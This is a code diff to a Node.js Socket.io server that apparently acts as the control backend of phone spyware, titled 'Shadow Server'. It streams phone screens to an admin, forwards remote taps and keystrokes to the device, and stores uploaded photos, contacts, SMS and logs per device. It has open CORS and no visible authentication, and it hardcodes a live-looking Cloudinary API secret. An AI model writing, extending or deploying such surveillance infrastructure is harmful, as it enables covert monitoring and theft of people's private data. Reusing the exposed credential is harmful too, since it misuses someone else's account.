@@ -4,80 +4,91 @@ const path = require('path');
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const cloudinary = require('cloudinary').v2;
-const http = require('http'); // ✅ NEW: HTTP Server
-const { Server } = require("socket.io"); // ✅ NEW: Socket.io for Realtime
+const http = require('http'); 
+const { Server } = require("socket.io"); 
 
 const app = express();
-const server = http.createServer(app); // ✅ Wrap Express in HTTP Server
+const server = http.createServer(app); // ✅ HTTP Server Wrapper
 const PORT = process.env.PORT || 3000;
 
-// ✅ SOCKET.IO SETUP (Live Control Ke Liye)
+// ==================================================
+// 🔥 1. SOCKET.IO SETUP (100MB LIMIT FIX)
+// ==================================================
 const io = new Server(server, {
     cors: {
-        origin: "*", // Kisi bhi website se allow karega
+        origin: "*", // Allow all connections
         methods: ["GET", "POST"]
     },
-    maxHttpBufferSize: 1e8 // 100MB buffer for heavy screen data
+    // 🔥 YE HAI MAIN FIX: 100 MB Limit
+    maxHttpBufferSize: 1e8, 
+    // Connection stable rakhne ke liye settings
+    pingTimeout: 60000, 
+    pingInterval: 25000
 });
 
-// --- 1. CLOUDINARY CONFIG ---
+// --- 2. CLOUDINARY CONFIG (DO NOT CHANGE) ---
 cloudinary.config({
     cloud_name: 'dxnh5vuik',
     api_key: '185953318184881',
     api_secret: 'CRKdBl2m68VLYV1rFnHz51XiL8Q'
 });
 
-// --- 2. SETUP & MIDDLEWARE ---
+// --- 3. MIDDLEWARE & SETUP ---
 const UPLOADS_DIR = path.join(__dirname, 'uploads');
 if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR);
 
 app.use(cors({ origin: '*' }));
+
+// 🔥 Body Parser Limit bhi 100MB kar di hai (Backup ke liye)
 app.use(bodyParser.json({ limit: '100mb' }));
 app.use(bodyParser.urlencoded({ limit: '100mb', extended: true }));
 app.use(express.static(__dirname));
 
-// Live Status (RAM Storage)
+// Live Status Storage (RAM)
 let devicesStatus = {}; 
 
-// --- 3. SOCKET.IO LOGIC (🔥 LIVE SCREEN & CONTROL) ---
+// ==================================================
+// 🔥 4. LIVE SCREEN SOCKET LOGIC
+// ==================================================
 io.on('connection', (socket) => {
     console.log('🔌 New Connection:', socket.id);
 
-    // 1. Join Room (Device aur Admin dono same ID se join karenge)
+    // 1. Join Room
     socket.on('join', (roomID) => {
         socket.join(roomID);
         console.log(`🔗 Socket Joined Room: ${roomID}`);
     });
 
-    // 2. SCREEN SHARE (Device -> Admin)
-    // Phone screen ki images bhejega, hum admin ko forward karenge
+    // 2. SCREEN SHARE (Phone -> Server -> Admin)
     socket.on('screen-data', (data) => {
-        const { room, image } = data;
-        // Sirf us room me bhejo (Admin ko milega)
-        socket.to(room).emit('screen-data', image);
+        // Yahan hum data ko process nahi kar rahe, seedha bhej rahe hain
+        // Taaki Server slow na ho. Browser khud sambhal lega badi image ko.
+        if (data && data.room) {
+            socket.to(data.room).emit('screen-data', data);
+        }
     });
 
-    // 3. REMOTE CONTROL (Admin -> Device)
-    // Admin click/swipe karega, hum phone ko forward karenge
+    // 3. REMOTE CONTROL (Admin -> Server -> Phone)
     socket.on('control-event', (data) => {
         const { room, action, x, y, key } = data; 
-        // Action: 'click', 'swipe', 'home', 'back'
-        socket.to(room).emit('control-event', { action, x, y, key });
-        console.log(`🎮 Control Event to ${room}: ${action}`);
+        if (room) {
+            socket.to(room).emit('control-event', { action, x, y, key });
+            console.log(`🎮 Command sent to ${room}: ${action}`);
+        }
     });
 
     socket.on('disconnect', () => {
-        console.log('❌ Disconnected:', socket.id);
+        // console.log('❌ Disconnected:', socket.id);
     });
 });
 
-// --- 4. ROOT ROUTE ---
+// --- ROOT ROUTE ---
 app.get('/', (req, res) => {
-    res.send('✅ Server is Running (Socket.io Active for Live Control)!');
+    res.send('✅ Shadow Server is Running (High Capacity Mode 100MB)');
 });
 
 // ==================================================
-//  GALLERY SYSTEM (HD PHOTOS)
+//  GALLERY SYSTEM (HD PHOTOS) - UNCHANGED
 // ==================================================
 
 app.post('/api/upload-image', (req, res) => {
@@ -112,7 +123,7 @@ app.get('/api/gallery-list/:device_id', (req, res) => {
 });
 
 // ==================================================
-//  ADMIN DASHBOARD & STATUS
+//  ADMIN DASHBOARD & STATUS - UNCHANGED
 // ==================================================
 
 app.get('/api/admin/all-devices', (req, res) => {
@@ -171,7 +182,7 @@ app.post('/api/send-command', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE
+//  DATA STORAGE (Contacts, SMS, Logs) - UNCHANGED
 // ==================================================
 
 app.post('/api/upload_data', (req, res) => {
@@ -226,5 +237,5 @@ app.get('/api/get-data/:device_id/:type', (req, res) => {
     else res.json([]);
 });
 
-// ✅ IMPORTANT: "server.listen" instead of "app.listen" for Socket.io
-server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} WITH SOCKET.IO`));
+// ✅ SERVER START
+server.listen(PORT, () => console.log(`🔥 SERVER RUNNING ON PORT ${PORT} (100MB Socket Allowed)`));
